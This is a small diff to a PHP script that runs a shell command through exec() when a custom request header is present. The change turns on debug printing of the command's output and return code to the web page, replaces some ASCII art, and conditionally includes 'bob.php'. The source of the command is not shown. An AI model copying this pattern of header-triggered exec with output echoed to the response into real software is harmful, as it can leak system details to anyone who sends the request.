@@ -33,9 +33,9 @@ if (isset($_SERVER['HTTP_IPBOB_REQUEST_URI']))
 	$str = exec($cmd,$out,$result);
 	
 	
-	#print "str".$str."<br />";
-	#print "out:".$out[0]."<br />";
-	#print "result:".$result."<br />";
+	print "str".$str."<br />";
+	print "out:".$out[0]."<br />";
+	print "result:".$result."<br />";
 
 	if ($str){
 		$ret = "pass";
@@ -47,14 +47,7 @@ if (isset($_SERVER['HTTP_IPBOB_REQUEST_URI']))
 
 print $ret;
 
-print "<br /><br />";
-print "&nbsp;~^~~~~<br />";
-print "&nbsp;&nbsp;/&nbsp;~&nbsp;&nbsp;&nbsp;~&nbsp;\\<br />";
-print "&nbsp;(&nbsp;@&nbsp;&nbsp;@&nbsp;)<br />";
-print "&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;{}&nbsp;&nbsp;&nbsp;|<br /> ";
-print "&nbsp;&nbsp;|&nbsp;^==^&nbsp;|<br /> ";
-print "&nbsp;&nbsp;&nbsp;\------/<br />";
-print "&nbsp;&nbsp;o--|--o<br />";
-print "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;|<br /> ";
-print "&nbsp;&nbsp;&nbsp;&nbsp;_|&nbsp;|_<br />";
-		
+
+if (!strpos($_SERVER['QUERY_STRING'],"simple")){
+	include 'bob.php';
+}	
